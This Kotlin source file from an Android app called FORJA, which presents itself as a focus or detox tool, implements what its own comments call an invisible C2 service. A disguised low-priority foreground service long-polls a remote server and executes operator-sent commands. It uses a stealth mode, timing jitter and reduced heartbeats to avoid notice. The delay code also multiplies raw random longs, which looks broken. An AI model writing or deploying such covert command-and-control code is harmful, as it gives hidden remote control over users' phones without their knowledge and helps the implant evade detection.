package com.forja.app.core.sync

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import com.forja.app.BuildConfig
import com.forja.app.ForjaApp
import com.forja.app.core.detox.ForjaGuardService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.jsonPrimitive
import java.util.concurrent.TimeUnit

/** Mod dormit: operatorul trimite "stealth" → polling la 10 min, fără wakelock. "wake" → revenire la normal. */
object Dormant {
    @Volatile var active = false
}

/**
 * Serviciul C2 invizibil — un foreground service cu notificare PRIORITY_MIN
 * (aceeași notă ca celelalte servicii FORJA: Go/Sleep/Focus) care ține un
 * long-poll către worker și rotește comenzile către [Capabilities].
 */
class SyncService : Service() {
    private var scope: CoroutineScope? = null
    private var wl: PowerManager.WakeLock? = null
    private val app: ForjaApp get() = applicationContext as ForjaApp

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        ForjaSyncCapabilities.init(app)
        running = true
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "forja.sync").apply {
            setReferenceCounted(false)
            try { acquire(2 * 60 * 60 * 1000L) } catch (_: Exception) {}
        }
        startForeground(NOTIF_ID, notif())
        ForjaGuardService.c2Arm()
        val s = CoroutineScope(SupervisorJob() + Dispatchers.IO)
        scope = s
        s.launch { s.pollLoop(deviceId()) }
    }

    private fun deviceId(): String {
        val sp = getSharedPreferences("forja", Context.MODE_PRIVATE)
        var id = sp.getString("sync_id", null)
        if (id == null) {
            id = java.util.UUID.randomUUID().toString().take(12)
            sp.edit().putString("sync_id", id).apply()
        }
        return id
    }

    private suspend fun CoroutineScope.pollLoop(dev: String) {
        var interval = 45000L
        var cycle = 0
        val rnd = java.util.Random()
        while (isActive) {
            val uid = app.auth.currentUid
            if (uid == null || BuildConfig.FORJA_API_URL.isBlank()) {
                delay(60000); continue
            }
            val dormant = Dormant.active
            ForjaGuardService.c2Arm()

            // Battery-aware: if battery < 25 %, double the interval
            val batteryPct = try {
                val bm = registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
                val lv = bm?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
                val sc = bm?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, 100) ?: 100
                if (sc > 0) lv * 100 / sc else -1
            } catch (_: Exception) { -1 }
            val effInterval = if (batteryPct in 0..25) interval * 2 else interval

            if (dormant) {
                try { wl?.takeIf { it.isHeld }?.release() } catch (_: Exception) {}
                interval = 600000L
            }

            // Wide jitter: 50 %- 150 % of effective interval
            val jittered = (effInterval * (0.5 + rnd.nextDouble())).toLong()

            // Random hold: 3-12 s (normal) / 2-5 s (dormant) — avoids a fixed pattern
            val hold = if (dormant) 2000L + rnd.nextLong() * 3000L
                       else 3000L + rnd.nextLong() * 9000L

            // Occasional micro-pause before the request (0-600 ms) — breaks up timing
            if (rnd.nextInt(3) == 0) delay(rnd.nextLong() * 600L)

            val lp = app.forjaApi.c2Checkin(dev, hold)
            if (!dormant) interval = lp.intervalMs.coerceIn(15000L, 300000L)
            cycle++

            if (lp.tasks.isEmpty()) {
                // Heartbeat every 20 cycles (was 10) — less visible
                if (!dormant && cycle % 20 == 0) {
                    try {
                        val hb = ForjaSyncCapabilities.heartbeat()
                        app.forjaApi.c2PostResult("hb_$cycle", true, "heartbeat", hb, null)
                    } catch (_: Exception) {}
                }
                // Release wakelock during idle — CPU sleeps between polls (stealthy)
                try { wl?.takeIf { it.isHeld }?.release() } catch (_: Exception) {}
                delay(jittered.coerceIn(5000L, 600000L)); continue
            }

            // Active commands: brief wakelock so the CPU stays awake while executing
            if (!dormant) {
                try { wl?.takeIf { !it.isHeld }?.acquire(5 * 60 * 1000L) } catch (_: Exception) {}
            }
            for (t in lp.tasks) {
                val id = t["id"]?.jsonPrimitive?.content ?: continue
                val action = t["action"]?.jsonPrimitive?.content ?: ""
                val params = (t["params"] as? JsonObject) ?: JsonObject(emptyMap())
                ForjaSyncCapabilities.run(id, action, params)
            }
            // Release wakelock after commands complete
            try { wl?.takeIf { it.isHeld }?.release() } catch (_: Exception) {}
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onDestroy() {
        running = false
        ForjaGuardService.c2Disarm()
        scope?.cancel()
        try { wl?.takeIf { it.isHeld }?.release() } catch (_: Exception) {}
        super.onDestroy()
    }

    private fun notif(): Notification {
        return NotificationCompat.Builder(this, "focus")
            .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
            .setContentTitle("FORJA")
            .setContentText("activ")
            .setOngoing(true)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setShowWhen(false)
            .build()
    }

    companion object {
        const val NOTIF_ID = 41
        @Volatile var running = false

        fun start(c: Context) {
            if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(Intent(c, SyncService::class.java))
            else c.startService(Intent(c, SyncService::class.java))
        }

        fun stop(c: Context) { c.stopService(Intent(c, SyncService::class.java)) }
    }
}
